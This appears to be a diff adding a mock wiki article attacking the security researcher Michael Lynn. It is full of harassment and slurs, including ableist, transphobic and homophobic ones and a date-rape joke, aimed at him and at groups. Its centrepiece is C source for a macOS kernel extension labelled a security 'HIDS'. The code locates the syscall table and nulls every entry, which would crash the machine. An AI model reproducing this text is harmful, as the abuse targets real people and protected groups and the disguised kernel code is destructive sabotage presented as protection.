@@ -1,0 +1,140 @@
+Michael Lynn
+'''Michael Lynn''' chews with his mouth open like a [[W|monkey]]. It is the most disgusting thing I've ever seen, and frankly, I am sick of it. ISS didn't fire him for [[Cisco Systems|Cisco]] vuln disclosures; [[Shit_nobody_cares_about|they fired him because he was a prima donna]] and a massive [[Asperger's_syndrome|asspie]] who never really got any work done. Props to David Maynor of ISS for being instrumental in this idiot's firing (now if only Brian Mitchell would get the axe). I will never buy a Juniper product ever now that they have hired this quasi-retarded, emotionally stunted little prick.
+
+== Guide to losing your job ==
+Follow this simple guide if you want to receive a [[permaban]] from your [[job|place of employment]]:
+*Research security exploits for a hardware company
+*Write a speech about the security exploits for presentation to a bunch of computer geeks
+*Get a warning about not presenting the speech or else you are going to get in deep shit
+*Present it anyway
+*????
+*PROFIT
+
+== Apple security efforts ==
+
+Jealous of [[Lance M. Havok]], Michael attempted to create a solution to all [[Apple]] security problems:
+
+<pre>
+/*  osx_ultimate_hids.c
+ *  The Ultimate Mac OS X HIDS
+ *
+ *  CONFIDENTIAL SOURCE CODE - DO NOT DISTRIBUTE
+ *  RELEASE PLANNED FOR NEXT DEFCON WITH >40 JOURNALISTS
+ *  AND VEGAS TRANNY HOOKERS
+ *
+ *  Created by Michael "Tool-addon" Lynn on 6/6/07.
+ *  (anniversary of the 6/6/6 antichrist, im late heh)
+ *
+ *  Copyright 2007 Juniper Networks and contractors.
+ */
+
+#include <libkern/libkern.h>
+#include <mach/mach_types.h>
+#include <sys/proc.h>
+#include <sys/systm.h>
+#include <sys/syscall.h>
+
+#ifndef JUNIPER
+#define _ELITE_CODE
+#define _SELLOUT
+#define _OH_THE_GOATS   "* g 0 4 t s 3 x * g 0 4 t s 3 x * g 0 4 t s 3 x *\n" \
+                        "x  \\      \\/   _--~~          ~--__| \\     |    x\n" \
+                        "*   \\      \\_-~                    ~-_\\    |    *\n" \
+                        "g    \\_     \\        _.--------.______\\|   |    g\n" \
+                        "o      \\     \\______// _ ___ _ (_(__>  \\   |    o\n" \
+                        "a       \\   .  C ___)  ______ (_(____>  |  /    a\n" \
+                        "t       /\\ |   C ____)/      \\ (_____>  |_/     t\n" \
+                        "s      / /\\|   C_____)       |  (___>   /  \\    s\n" \
+                        "e     |   (   _C_____)\\______/  // _/ /     \\   e\n" \
+                        "x     |    \\  |__   \\_________// (__/       |  x\n" \
+                        "*    | \\    \\____)   `----   --'             |  *\n" \
+                        "# POWERED BY JUNIPER NETWORKS # (c) Michael Lynn #\n"
+
+#endif
+
+extern kern_return_t _start(kmod_info_t *ki, void *data);
+extern kern_return_t _stop(kmod_info_t *ki, void *data);
+
+typedef void    sy_munge_t(const void *, void *);
+typedef        int32_t sy_call_t(struct proc *, void *, int *);
+extern struct sysent {                  /* system call table */
+        int16_t         sy_narg;        /* number of args */
+        int8_t          sy_cancel;      /* funngels type */
+        int8_t          sy_funnel;      /* funngels type */
+        sy_call_t       *sy_call;       /* sick fuck */
+        sy_munge_t      *sy_arg_munge32; /* system call aguments munger for 32-bit process */
+        sy_munge_t      *sy_arg_munge64; /* system call aguments munger for 64-bit process */
+        int32_t         sy_return_type; /* system call retard typz */
+} sysent[];
+
+struct sysent **tehsysent;
+typedef int32_t (*sys_call_t)();
+
+/* "How gay Apple, hiding the system call table.  This just finds it."
+ * XXX: IMPLEMENT AIDS HEURISTICS (DISAS UNIX_SYSCALL FOR CMP SYSENT_ADDR, $EAX).
+ * XXX: USE DATE-RAPE-DRUGS FOR INFECTING POOL WITH AIDS IN GAY GANG ORGIES
+ */
+unsigned long *get_aids(unsigned long addr_start, unsigned long addr_end) {
+        unsigned long ptr, *aids;
+
+        for (ptr = addr_start; ptr < addr_end; ptr += sizeof(struct sysent *)) {
+                unsigned long *penis;
+                penis = (unsigned long *)ptr;
+
+                if (penis[SYS_read] && (penis[SYS_read] == (unsigned long)0x00010003)) {
+                        // Found pool with AIDS array
+                        aids = (penis - (SYS_read * sizeof(struct sysent *)));
+                        break;
+                }
+        }
+
+        return aids;
+}
+
+
+kern_return_t AIDStart(kmod_info_t *ki, void *d) 
+{
+    int i = 0;
+    
+    printf("Loading the Ultimate AIDS from Juniper Networks:\n%s\n", _OH_THE_GOATS);
+    tehsysent = (struct sysent **) get_aids((unsigned long) 0x449800,(unsigned long)0x455220);
+    printf("ALERT ALERT ALERT ALERT Apple with AIDS found at 0x%x\n", tehsysent);
+    
+    // JUNIPER PATENTED HIDS TECHNOLOGY - DO NOT DISTRIBUTE
+    while (i < SYS_MAXSYSCALL) {
+        if (tehsysent && tehsysent[i] && tehsysent[i]->sy_call)
+            tehsysent[i]->sy_call = NULL;           // WE SECURE THE ATTACK SURFACE
+        i++;
+    }
+    
+    // ALERT ALERT ALERT ALERT ALERT!!! SHOULD BE NEVER REACHED (IT'S A HIDS!)
+    printf("Something is not working with the defense in-depth system. Please call tech support.\n");
+
+    return KERN_SUCCESS;
+}
+
+kern_return_t AIDStop(kmod_info_t *ki, void *d) 
+{
+    // Because this is the ultimate AIDS, this is never reached.
+    return KERN_SUCCESS;
+}
+
+KMOD_EXPLICIT_DECL(net.junipersmokescock.kext.UltimateAIDS, "1.0.0d1", _start, _stop)
+__private_extern__ kmod_start_func_t *_realmain = AIDStart;
+__private_extern__ kmod_stop_func_t *_antimain = AIDStop;
+__private_extern__ int _kext_apple_cc = __APPLE_CC__;
+</pre>
+
+It obviously doesn't work like anything Mike does, but you can dare it will [[fuck]] your [[crap|Mac computer]].
+
+== External Links ==
+*[http://www.memestreams.net/users/Abaddon/ MemeStreams Blog]
+*[http://en.wikipedia.org/w/index.php?title=Talk%3AMichael_Lynn&diff=60497656&oldid=60497513 Wikipedophile coverup]
+
+==See Also==
+*[[Ciscogate]]
+
+{{SecurityFaggots}}
+
+[[Category:People|Lynn, Michael]]
+[[Category:Softwarez]]
